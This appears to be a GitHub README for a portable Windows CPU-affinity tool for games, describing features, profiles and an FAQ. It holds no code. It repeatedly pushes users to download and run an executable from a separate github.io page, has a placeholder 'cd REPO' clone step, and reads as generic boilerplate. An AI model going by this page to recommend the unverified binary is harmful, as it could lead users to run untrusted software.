# CPU Affinity Manager v2026 - CPU Affinity Manager 2026

> **CPU Affinity Manager is a portable Windows tool that pins game processes to chosen CPU cores, stores those scheduler choices, and reapplies them on its own in the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelbaker71/cpu-affinity-manager-2026?style=flat-square)](https://github.com/michaelbaker71/cpu-affinity-manager-2026)

---

<p align="center">
  <a href="https://michaelbaker71.github.io/cpu-affinity-manager-2026/">
    <img src="https://img.shields.io/badge/Download-CPU%20Affinity%20Manager%20Latest-brightgreen?style=for-the-badge" alt="Download CPU Affinity Manager">
  </a>
</p>

> **[Direct Download - CPU Affinity Manager v2026](https://michaelbaker71.github.io/cpu-affinity-manager-2026/)**

---

[Download Latest Build](https://michaelbaker71.github.io/cpu-affinity-manager-2026/)

---

## What it does

On Windows, CPU Affinity Manager lets you map each game to specific cores and a process priority class. It can tell performance cores apart from efficiency cores, so you can lock in scheduling habits that fit each title or workload and reuse them later.

You get a single portable executable—no classic install step. After you define profiles, the app watches for those games, puts the affinity rules back in place when they start, and keeps a record of what it changed.

---

## Feature highlights

- Store a dedicated CPU affinity mask per game.
- Pair affinity with a process priority class.
- Identify and aim at performance cores versus efficiency cores.
- Watch live processes and react when a configured game appears.
- Automatically restore each game’s rules within a session.
- Pick affinity masks from one-click presets.
- Inspect affinity updates in the built-in log.
- Stay portable on Windows 10 and Windows 11.

---

## Getting it running

### Download

1. Visit the [latest build](https://michaelbaker71.github.io/cpu-affinity-manager-2026/).
2. Grab the Windows executable.
3. Put it in any folder you prefer.
4. Run the executable as-is.

No installer is involved. Leave the binary somewhere stable so saved profiles and monitoring stay easy to reach.

### Clone the repository

```bash
git clone https://github.com/michaelbaker71/cpu-affinity-manager-2026.git
cd REPO
```

Follow the project’s own instructions to build or start it from source.

---

## How to use it

1. Open CPU Affinity Manager.
2. Pick an existing game profile or make a new one.
3. Set a CPU affinity mask manually or via a preset.
4. Assign a process priority class if you need one.
5. Save the profile.
6. Start the game and allow the watcher to notice the process.
7. Open the activity log to verify the affinity update landed.

On CPUs that mix P-cores and E-cores, lean on the detection data so each profile matches the cores you care about for that workload.

---

## Profiles and settings

Everything is driven by per-game profiles inside the app. A profile may hold:

- The game or process to match.
- The CPU affinity mask.
- The process priority class.
- Which performance or efficiency core layout you selected.

Change settings through the profile UI instead of hand-editing files. Data stays with that game’s profile and can be updated whenever your CPU layout or preferences shift.

---

## System requirements

- Windows 10 or Windows 11.
- Any processor Windows already supports.
- Rights sufficient to inspect and adjust the target game processes.
- Disk room for the portable binary, profiles, and logs.
- Installer not required.

---

## FAQ

### Is installation mandatory?

No. You receive one portable executable and can start it from any folder you choose.

### Separate rules per game?

Yes. Each profile keeps its own affinity mask and priority class for a given game or process.

### What occurs when a listed game launches?

The watcher matches the process and applies that game’s saved profile.

### Can profiles use P-cores and E-cores?

Core detection exposes performance and efficiency groups so you can target the sets that fit your schedule plan.

### How do I confirm a rule took effect?

Check the affinity-change log for the recorded process updates.

### How are updates handled?

Fetch the newest build from the [latest download page](https://michaelbaker71.github.io/cpu-affinity-manager-2026/) and swap in the new executable. Keep profile or config data that lives outside the binary.

### A profile never applied—what next?

Make sure the process name matches the running game, confirm the profile was saved, and read the activity log for detection and apply attempts.

### Where is support?

Open GitHub Issues on this repository for bugs, setup questions, and feature talk.

---

## Roadmap

- Smoother profile management flows.
- Clearer insight into process detection and which rules ran.
- Better presets for mixed P-core / E-core machines.
- Ongoing work on logging and everyday portable use.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
